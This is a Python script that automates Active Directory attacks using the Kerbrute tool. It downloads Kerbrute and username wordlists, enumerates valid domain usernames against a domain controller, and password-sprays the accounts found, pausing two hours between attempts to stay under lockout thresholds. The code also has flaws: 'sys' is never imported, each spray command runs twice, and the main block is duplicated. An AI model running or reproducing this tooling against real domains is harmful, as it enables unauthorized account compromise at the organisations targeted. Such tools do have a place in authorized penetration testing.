import argparse
import subprocess
import os
import re
import time
from colorama import Fore, Style

# Define Banner
def printBanner():
    print(Fore.YELLOW + """
     dBP dBP     dBBBP    dBBBBBb    dBBBBb  .dBBBBP   dBBBBBb   dBBBBBb  dBBBBBb dBP dBP
    dBP.d8P                   dBP       dBP  BP            dB'       dBP       BB    dBP 
   dBBBBP'     dBBP       dBBBBK    dBBBK'   `BBBBb    dBBBP'    dBBBBK    dBP BB   dBP  
  dBP BB      dBP        dBP  BB   dB' db       dBP   dBP       dBP  BB   dBP  BB  dBP   
 dBP dB'     dBBBBP     dBP  dB'  dBBBBP'  dBBBBP'   dBP       dBP  dB'  dBBBBBBB dBP    
                                                                                         """)
    print(Style.RESET_ALL)

def downloadKerbrute():
    print(Fore.GREEN + "Checking for Kerbrute and Userlists...\n")
    kerbrute_filename = 'kerbrute_linux_amd64'
    kerbrute_url = "https://github.com/ropnop/kerbrute/releases/download/v1.0.3/" + kerbrute_filename
    userlists_urls = [
        "https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/master/john.smith.txt",
        "https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/master/jjsmith.txt",
        "https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/master/johnsmith.txt",
        "https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/master/jsmith.txt",
        "https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/master/service-accounts.txt"
    ]

    urls_to_download = [kerbrute_url] + userlists_urls
    total_urls = len(urls_to_download)
    downloaded = 0

    for url in urls_to_download:
        filename = url.split('/')[-1]
        if not os.path.exists(filename):
            subprocess.run(['wget', '-q', url])  # '-q' option for quiet mode
            downloaded += 1
            printProgressBar(downloaded, total_urls, prefix='Progress:', length=50)

    if kerbrute_filename in os.listdir('.'):
        subprocess.run(['chmod', '+x', kerbrute_filename])

def countdownTimer(duration):
    while duration:
        hours, remainder = divmod(duration, 3600)
        minutes, seconds = divmod(remainder, 60)
        timer = "{:02}:{:02}:{:02}".format(hours, minutes, seconds)
        print("\r" + timer, end="")
        time.sleep(1)
        duration -= 1
    print("\rCountdown finished. Proceeding to next password.")


def invokeKerbrute(domain, dc_ip=None, custom_ulist=None):
    userlists = [custom_ulist] if custom_ulist else [file for file in os.listdir('.') if file.endswith('.txt')]
    total_userlists = len(userlists)
    enumerated = 0
    unique_usernames = set()

    file_mode = 'a' if os.path.exists('validated_users.txt') else 'w'

    for userlist in userlists:
        print(Fore.BLUE + f"Using {userlist} to enumerate {domain}")
        command = ['./kerbrute_linux_amd64', 'userenum', '-d', domain, userlist]
        if dc_ip:
            command.extend(['--dc', dc_ip])

        result = subprocess.run(command, capture_output=True, text=True)
        valid_usernames = re.findall(r'\[\+\] VALID USERNAME:\s+([^\s]+)', result.stdout)
        unique_usernames.update(valid_usernames)

        if "Couldn't find any KDCs for realm" in result.stderr:
            print(Fore.RED + f"Error: Couldn't find any KDCs for realm {domain}. Please specify a Domain Controller with --dc-ip.\n")
            return

        enumerated += 1
        printProgressBar(enumerated, total_userlists, prefix='Progress:', length=50)

    with open('validated_users.txt', file_mode) as validated_users_file:
        for username in unique_usernames:
            validated_users_file.write(username + '\n')

    print(Fore.GREEN + f"\nTotal unique usernames enumerated: {len(unique_usernames)}")


def removeDuplicates():
    with open('validated_users.txt', 'r') as file:
        unique_usernames = set(file.readlines())

    with open('validated_users.txt', 'w') as file:
        file.writelines(unique_usernames)

def printProgressBar(iteration, total, prefix='', suffix='Complete', length=100, fill='█', printEnd="\r"):
    percent = ("{0:.1f}").format(100 * (iteration / float(total)))
    filledLength = int(length * iteration // total)
    bar = fill * filledLength + '-' * (length - filledLength)
    print(f'\r{prefix} |{bar}| {percent}% {suffix}', end=printEnd)
    # Print New Line on Complete
    if iteration == total: 
        print()

def passwordSpray(domain, passlist, custom_ulist, dc_ip=None):
    with open(passlist, 'r') as file:
        passwords = [line.strip() for line in file]

    temp_output_file = "kerbrute_output.txt"

    for password in passwords:
        print(Fore.GREEN + f"Spraying with password: {password}" + Style.RESET_ALL)
        command = ['./kerbrute_linux_amd64', 'passwordspray', '-d', domain, custom_ulist, password]
        if dc_ip:
            command += ['--dc', dc_ip]
        result = subprocess.run(command, capture_output=True, text=True, shell=False)

        with open(temp_output_file, 'w') as outfile:
            subprocess.run(command, stdout=outfile, stderr=subprocess.STDOUT)

        # Read the output file and search for "VALID LOGIN"
        with open(temp_output_file, 'r') as infile:
            valid_logins = [line.strip() for line in infile if "VALID LOGIN" in line]

        for login in valid_logins:
            print(Fore.GREEN + login + Style.RESET_ALL)

        # Wait for 2 hours to avoid lockouts
        countdownTimer(7200)  # 2 hours in seconds

def main():
    parser = argparse.ArgumentParser(description='Kerbrute User Enumeration and Password Spray Script')
    parser.add_argument('-d', '--domain', required=True, help='Domain to enumerate')
    parser.add_argument('--dc-ip', help='IP address of the Domain Controller')
    parser.add_argument('--spray', action='store_true', help="Skip enumeration and perform password spray")
    parser.add_argument('--passlist', help='Path to the password list for spraying', required='--spray' in sys.argv)  # Require passlist if --spray is used
    parser.add_argument('--custom-ulist', help='Path to a custom userlist for Kerbrute', required='--spray' in sys.argv)  # Require custom-ulist if --spray is used
    args = parser.parse_args()

    printBanner()
    downloadKerbrute()

    # Skip enumeration if --spray is used and directly spray passwords
    if args.spray:
        if args.passlist and args.custom_ulist:  # Ensuring both required arguments are provided
            passwordSpray(args.domain, args.passlist, args.custom_ulist, args.dc_ip)
    else:
        # Proceed with user enumeration if --spray is not specified
        if args.custom_ulist:
            invokeKerbrute(args.domain, args.dc_ip, args.custom_ulist)
        else:
            # If custom_ulist is not provided, invokeKerbrute without it (which will use default lists)
            invokeKerbrute(args.domain, args.dc_ip)

        removeDuplicates()  # This can be moved or conditioned based on your workflow

if __name__ == '__main__':
    main()

if __name__ == '__main__':
    main()
